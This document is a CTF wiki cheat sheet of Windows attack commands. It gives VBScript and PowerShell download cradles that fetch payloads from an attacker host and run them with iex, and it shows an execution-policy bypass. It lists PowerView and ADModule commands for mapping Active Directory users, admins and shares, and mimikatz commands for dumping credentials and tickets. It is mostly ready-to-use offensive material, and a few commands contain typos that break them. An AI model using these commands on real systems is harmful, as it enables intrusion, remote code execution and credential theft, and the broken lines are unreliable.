---
layout: article
title: Windows
permalink: /wikis/ctf/windows
aside:
    toc: true
sidebar:
    nav: wikis
---


## File Transfer

### cscript

If command execution is available and firewalls allow for file transfers: 

cscript.exe is a command-line version of the Windows Script Host that provides command-line options for setting script properties. With cscript.exe, you can run scripts by typing the name of a script file at the command prompt.

create wget.vbs for vbscript transfer (in one single command) 
```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs && echo StrFile = WScript.Arguments.Item(1) >> wget.vbs && echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs && echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs && echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs && echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs && echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs && echo Err.Clear >> wget.vbs && echo Set http = Nothing >> wget.vbs && echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs && echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs && echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs && echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs && echo http.Open ^"GET^", strURL, False >> wget.vbs && echo http.Send >> wget.vbs && echo varByteArray = http.ResponseBody >> wget.vbs && echo Set http = Nothing >> wget.vbs && echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs && echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs && echo strData = ^"^" >> wget.vbs && echo strBuffer = ^"^" >> wget.vbs && echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs && echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs && echo Next >> wget.vbs && echo ts.Close >> wget.vbs 
```
 
Use cscript to run the wget.vbs script 
```
cscript <script-name> http://<attacker-ip>/<malicious-file> <output-file> 
```

### Powershell
File transfer
```
echo $storageDir = $pwd> wget.ps1 && echo $webclient = New-Object System.Net.WebClient>> wget.ps1 && echo $url = "http://<attacker-ip>/<malicious-file>">> wget.ps1 

echo $file = "<output-file>">> wget.ps1 
echo $webclient.DownloadFile($url,$file)>> wget.ps1 
```
 
Confirm script creation 
```
type wget.ps1 
```
 
Download file with System.Net.WebClient
```
iex(New-Object Net.WebClient).downloadFile("http://someserver/somefile.exe", "Filename.exe")
```

Download and execute script
```
iex (New-Object Net.WebClient).DownloadString("http://someserver/payload.ps1")

$ie=New-Object -ComObject InternetExplorer.application;$ie.visible=$False;$ie.navigate("http://someserver/payload.ps1");sleep 5;$response=ie.Document.body.innerHTML;$ie.quit();iex $response
```

Download and execute script (PSv3+)
```
iex(iwr "http://someserver/payload.ps1")

$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open("GET", "http://someserver/payload.ps1",$false);$h.send();iex $h.responseText

$wr = [System.NEt.WebRequest]::Create("http://someserver/payload.ps1")
$r = $wr.GetResponse()
iex ([System.IO.StreamReader]($r.GetReponseStream())).ReadtoEnd()
```


## PowerShell

Help commands
```
Update-Help
Get-Help <cmdlet> -Full
Get-Help <cmdlet> -Examples
```

List commandlets
```
Get-Command -CommandType cmdlet
```

List Processes
```
Get-Process
```

PS Modules
```
Import-Module <module path>
Get-command -Module <module name>
```

Execute ps script<br>
Execution Policy not implemented as a security measure, but as a preventative measure for accidental script execution
```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File <scriptname>

powershell -c <cmd>
powershell -encodedcommand $env:PSExecutionPolicyPreference="bypass"
```

### Domain Enumeration 

```
PS C:\> $ADClass = [System.DirectoryServices.Activedirectory.Domain]
PS C:\> $ADClass::GetCurrentDomain()
```


#### Powerview
<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" target="_blank">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a>

Get current domain
```
Get-NetDomain
```

Get object of another domain
```
Get-NetDomain -Domain some_domain.local
```

Get domain SID for the current domain
```
Get-DomainSID
```

Get domain policy for the current domain
```
Get-DomainPolicy
```

Get domain controllers for the current domain
```
Get-NetDomainController
```

Get domain controllers for another domain
```
Get-NetDomainController -Domain some_domain.local
```

Get a list of users in the current domain
```
Get-NetUser
Get-NetUser -Username user1
```

Get list of all properties for users in the current domain
```
Get-UserProperty
Get-UserProperty Properties pwdlastset
```

Search for a particular string in a user's attributes:
```
Find-UserField -SearchField Description -SearchTerm "built"
```

Get a list of computers in the current domain
```
Get-NetComputer
Get-NetComputer -OperatingSystem "*Server 2016*"
Get-NetComputer -Ping
Get-NetComputer -FullData
```

Get all the groups in the current domain
```
Get-NetGroup
Get-NetGroup-Domain targetdomain
Get-NetGroup -FullData
```

Get all groups containing the word "admin" in group name
```
Get-NetGroup *admin*
```

Get all the members of the Domain Admins group
```
Get-NetGroupMember -GroupName "Domain Admins" -Recurse
```

Get the group membership for a user:
```
Get-NetGroup UserName "user1"
```

List all the local groups on a machine (needs administrator privs on non
dc machines):
```
Get-NetLocalGroup -ComputerName dc-1.parent.child.local -ListGroups
```

Get members of all the local groups on a machine (needs administrator
privs on non dc machines):
```
Get-NetLocalGroup -ComputerName dc-1.parent.child.local -Recurse
```

Get actively logged users on a computer (needs local admin rights on
the target):
```
Get-NetLoggedon -ComputerName <servername>
```

Get locally logged users on a computer (needs remote registry on the
target started by default on server OS):
```
Get-NetLoggedon -ComputerName dc-1.parent.child.local
```

Get the last logged user on a computer (needs administrative rights and
remote registry on the target):
```
Get-LastLoggedOn -ComputerName <servername>
```

Find shares on hosts in current domain:
```
Invoke-ShareFinder -Verbose
```

Find sensitive files on computers in the domain:
```
Invoke-FileFinder -Verbose
```

Get all fileservers of the domain:
```
Get-NetFileServer
```


#### ADModule
Does not require Remote Server Administration Tools (RSAT) or admin privileges.
<a href="https://github.com/samratashok/ADModule" target="_blank">https://github.com/samratashok/ADModule</a>
<a href="https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=win10-ps" target="_blank">https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=win10-ps</a>

List all cmdlets
```
PS C:\> Import-Module C:\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose

PS C:\> Import-Module C:\AD\Tools\ADModule\ActiveDirectory\ActiveDirectory.psd1

PS C:\> Get-Command -Module ActiveDirectory
```

Get current domain
```
Get-ADDomain
```

Get object of another domain
```
Get-ADDomain -Identity some_domain.local
```

Get domain SID for the current domain
```
(Get.ADDomain).DomainSID
```

Get domain policy for the current domain
```
(Get-DomainPolicy)."system access"
```

Get domain policy for another domain
```
(Get-DomainPolicy -domain some_domain.local)."system access"
```

Get domain controllers for the current domain
```
Get-ADDomainController
```

Get domain controllers for another domain
```
Get-NetDomainController -Domain some_domain.local -Discover
```

Get a list of users in the current domain
```
Get-ADUser -Filter * -Properties *
Get-ADUser -Identity user1 -Properties *
```

Get list of all properties for users in the current domain
```
Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name
Get-ADUser -Filter * -Properties * | select name,@{expression=[datetime]::fromFileTime($_.pwdlastset)}}
```

Search for a particular string in a user's attributes:
```
Get-ADUser -Filter 'Description like "*built*"' -Properties Description | select name,Description
```

Get a list of computers in the current domain
```
Get-ADComputer -Filter * | select Name
Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' -Properties OperatingSystem | select Name,OperatingSystem
Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}
Get-ADComputer -Filter * -Properties *
```

Get all the groups in the current domain
```
Get-ADGroup -Filter * | select Name
Get-ADGroup -Filter * -Properties *
```

Get all groups containing the word "admin" in group name
```
Get-ADGroup -Filter 'Name -like "*admin*"' | select Name
```

Get all the members of the Domain Admins group
```
Get-ADGroupMember -Identity "Domain Admins" -Recursive
```

Get the group membership for a user:
```
Get-ADPrincipalGroupMembership -Identity user1
```


## Mimikatz

Extracting information from mimikatz 
```
log 
privilege::debug 
sekurlsa::logonpasswords 
sekurlsa::tickets /export 

vault::cred 
vault::list 

token::elevate 
vault::cred 
vault::list 
lsadump::sam 
lsadump::secrets 
lsadump::cache
```




